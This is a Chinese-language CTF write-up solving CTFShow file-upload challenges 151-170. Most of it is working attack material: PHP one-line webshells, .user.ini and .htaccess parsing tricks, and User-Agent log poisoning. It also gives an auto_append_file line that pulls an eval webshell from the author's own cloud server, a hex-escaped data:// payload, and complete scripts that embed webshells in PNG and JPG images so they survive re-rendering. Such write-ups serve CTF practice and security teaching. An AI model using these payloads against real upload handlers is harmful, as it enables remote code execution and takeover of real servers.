# CTFSHOW 文件上传（151-170）
## 151
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951445972_image.png)
直接修改png为php

然后写一个文件一句话木马`<?php eval($_POST[1]);?>`

上传文件，`/upload/1.php`然后POST传参 ，flag在“../flag.php”

## 152
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951789432_image.png)
尝试上题操作，后端加了验证

将后缀改为png，可以上传，访问后图片是被包裹的
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784951890503_image.png)
抓包，重放修改，后端对文件类型进行验证
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784952659681_image.png)
修改文件类型后，上传成功
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784952757421_image.png)
下面就是找目录，找flag

## 153
对文件名php进行过滤，大写可以绕过但是
文件名大写是不可以解析的必须小写。

发现在`/upload/`有index.php

可以利用`.user.ini` 是**PHP 专属的自定义配置文件**，属于目录级 PHP 配置，作用于当前文件夹及其所有子目录，仅对 PHP 生效

`.user.ini`中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(./1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入

利用`.user.ini`的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。
	
	auto_prepend_file = filename        //包含在文件头
	auto_append_file = filename         //包含在文件尾
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023060883_image.png)
上传`.user.ini`文件前要改一下前端的过滤

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022502325_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022111983_image.png)
传入2个文件，`.user.ini`用于包含`1.txt`,`1.txt`来被解析去执行一句话木马

访问/upload  是这样的话就成功了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022604146_image.png)
接下来就是post给1传值，在../发现flag


## 154
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023060883_image.png)
继续上题操作
在上传1.txt的时候
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785023392799_image.png)
这题多了对文件内容的检测

二分法排除，对内容php进行检测，除了php还可以使用短标签，`php`->`=`
其他的不变。
访问/upload  是这样的话就成功了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785022604146_image.png)
接下来就是post给1传值，在../发现flag

----
也可以使用`.phtml`作为后缀

`.phtml` 本质**就是 PHP 文件**，和 `.php` 功能完全一致，只是后缀不同。

----

155
-
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785191078253_image.png)

文件类型不合规

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785192944136_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785192952057_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785192948332_image.png)

156
-
用上题的pyload，文件内容又被过滤了`[]`,没有检查文件头

好了，这一题的`1.txt`可以这样写
```
<?=eval($_POST{1});?>
```
在这里`{ }`也可以代替`[ ]`

`.user.ini`:
```
auto_prepend_file = 1.txt
```
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785217045415_image.png)

157
-
这一题经过测试 对内容过滤了 `[ ]` `{ }` `;` `php`

所以1.txt可以这样写
```
<?= eval(array_shift($_POST)) ?>
```
1. PHP 只有多条语句才必须分号`;`单语句末尾省略 `;` 完全合法

2. `$_POST `本身是一个关联数组， POST 提交的参数会按提交顺序存入这个数组

3. array_shift($_POST) 取出数组POST的第一个元素,只能读取第一个POST 参数，参数顺序不能乱


`assert()` 是 PHP 断言函数，参数会被当作 PHP 代码直接执行，和 `eval()` 功能高度相似
```

assert(代码字符串)

assert("phpinfo()") // 等同于 eval("phpinfo();")，直接输出phpinfo
```

158
-
上题pyload可用

159
-
经过测试这次还要多过滤 `（）`

额，include包含日志文件，在日志文件中上传UA一句话木马

`<?=include '/var/lo'.'g/nginx/access.lo'.'g' ?>`

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785220001932_image.png)
配置文件成功包含1.txt，1.txt成功包含日志文件

然后写码，注意 写码只有一次机会
url/1.txt 在UA上写入`<?php eval($_POST[1])?>`会报错404，没关系，木马已经写入日志文件了。这里看不到404是因为跳转到了index.php（不重要）
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785220220728_image.png)
最后，就是RCE了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785220192876_image.png)

160
-
经过测试这次还要多过滤 `空格`但是不影响inclode包含日志文件

操作与上题一样，注意配置文件和1.txt的空格就行
1.txt`<?=include'/var/lo'.'g/nginx/access.lo'.'g'?>`
.user.ini`auto_prepend_file=1.txt`

161
-
这次上传`.user.ini`显示文件类型不合规。
长时间去找，发现`GIF89a`文件头 png类型 可以上传

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222818942_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222792700_image.png)

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222752201_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785222778027_image.png)


162
-
文件内容不能有点`.` 用无后缀的文件。目前过滤`php` `{}` `[]` `()` `;` `空格` `.` 

上传配置文件
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785223747558_image.png)

-------

日志包含：
远程包含调用

由于过滤了`. `所以使用	**远程包含**

1. 将木马上传至远程服务器，由于过滤了`. `所以需要转换下，mm

`<?php eval($_POST[x]);?>`
或者
`<?php system('cat ../f*');?>`
2. 上传包含文件 .user.ini
```
GIF89a 
auto_prepend_file=txt
```
3. 上传远程调用文件 txt IP转数字
```
GIF89a
<?=include"http://数字IP/mm"?>

```
4. 访问upload

----

[ANSI-C 编码 & 进制转换工具箱](https://xobear.cn/CTF/Web/PHP/ansi-c-encode.html)

data伪协议绕过

`data://text/plain,内容 `的意思是：创建一个“内容直接写在地址里的虚拟文件”。

payload构造：`GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?>`

在include可以使用的前提下，利用伪协议执行代码。将我们的代码`<?php system($_GET['cmd']);`进行字符串转义来绕过即可。

上传一个文件png，内容为`GIF89a<?=include"data://text/plain,<?\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b"?>`

再上传一个文件`.user.ini`内容为

`GIF89a auto_prepend_file=png`

最后访问`/upload/?cmd=cat ../flag.php`即可


163
-----

远程文件包含（从服务器购买到找到flag）
服务器选用 腾讯云   在微信小程序上买的CVM

`按量计费`
`地区任意选`
`实例配置不用管`
`公共镜像Ubantu`
`存储最低20G`
`网络默认`
`公网带宽，一定要勾上，免费分配独立公网IP`
`计费模式按流量使用`
`登录方式自动生成密码（可以改）`

安全组，只需勾选`TCP：22`和`TCP：80`就行

大概配置费0.21RMB/小时，带宽0.8RMB/G

操作如下

记住自己的公网IP，电脑打开终端`ssh ubuntu@自己IP`
密码在控制台自己看（终端输入密码是看不到的）

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785463988435_image.png)

	mkdir -p ~/rfi-static  /创建目录
	cd ~/rfi-static
	printf '%s\n' '<?php eval($_GET["cmd"]);'> index.html
	sudo python3 -m http.server 80 --bind 0.0.0.0

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785464170870_image.png)
直接输入ip出现这样就完成一半了

接下来就是准备上传`.user.ini`
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785464277192_image.png)

注意，文件内容有过滤,`.`用不了。 这里用的是纯数字长地址  就是把a.b.c.d转为纯数字

计算公式`a.b.c.d = a*256^3 + b*256^2 + c*256 + d`


脚本如下
```
import ipaddress


def main():
    ip = input("请输入 IPv4 地址，例如 1.2.3.4：").strip()

    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        print("输入错误：这不是合法的 IP 地址")
        return

    if addr.version != 4:
        print("输入错误：只支持 IPv4 地址")
        return

    print(f"纯数字长地址：{int(addr)}")


if __name__ == "__main__":
    main()

```
```
GIF89a      /有对文件头的检查，GIF89a可以通过
auto_append_file=http://ip长地址/
```
上传成功后访问 `url/upload/`
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785465145900_image.png)
然后给GET就可以了
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785465091083_image.png)


164
-
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785537596634_image.png)
图片有被包含
只要图片二次渲染中有我们的一句话木马就可以RCE	



图片马脚本
```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```



![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785544405065_image.png)

参考
[二次渲染绕过](https://www.cnblogs.com/1ink/p/15115240.html)

165
-
只可以传，jpg格式的图像。先上传一张jpg，然后再下载下来，再给这张图片嵌入木马
上传上去的图片经过渲染，与原照片不同，下载下来后，再嵌入木马上传，渲染改动小

关于图片可能需要多试一试。可能我的[头像]()是可以的
借用国外大妞的代码
```
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = "<?=eval(\$_POST[1]);?>"; //注意$需要转义


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>

```
注意要有php
运行代码：`php 脚本.php 图片.jpg` ->`Success! :pyload_图片.jpg`
上传图片马记得抓包
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785637823793_image.png)


166
-

直接在zip包后面加入一句话
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785639892684_image.png)


![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785640038621_image.png)
167
----
httpd 是 Apache HTTP Server 的简称.是一款功能强大、灵活性高的 Web 服务器，适用于各种规模的 Web 应用场景。

什么是htaccess文件

`.htaccess`是一个配置文件，用于运行Apache网络服务器  软件的网络服务器上。当`.htaccess`文件被放置在一个 "通过Apache Web服务器加载 "的目录中时，`.htaccess`文件会被Apache Web服务器软件检测并执行。这些`.htaccess`文件可以用来改变Apache Web服务器软件的配置，以启用/禁用Apache Web服务器软件所提供的额外功能和特性。 

`.htaccess`文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。

`.htaccess` 中有 # 单行注释符, 且支持 \拼接上下两行

`.htaccess`文件所在的目录及其所有子目录，若要启动.htaccess配置文件，我们需要在服务器的主配置文件将 `AllowOverride` 设置为 `All`
`AllowOverride All  #启动.htaccess文件的使用`



`AddType application/x-httpd-php .jpg `

```
AddType：给指定文件后缀绑定一个解析 MIME 类型
application/x-httpd-php：Apache 交给 PHP 解释器执行的脚本类型
.jpg：图片后缀
让服务器把后缀为 .jpg 的文件，当成 PHP 代码解析执行。
```

----
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785810680309_image.png)
jpg的图片马，用上一题的即可。
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785810747493_image.png)

flag在“../"

168
-
基础免杀。上传png抓包改名字和内容，在upload目录下。就动态函数
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785811488080_image.png)


``<?=`cat ../flagaa.php`?>``


169
-
高级免杀
抓包，先传index.php内容任意。再传.user.ini 包含日志文件

![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785815164806_image.png)
![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1785815259930_image.png)

访问/upload/  给UA一句话。然后就是RCE了，

170
-
操作与上题一样











































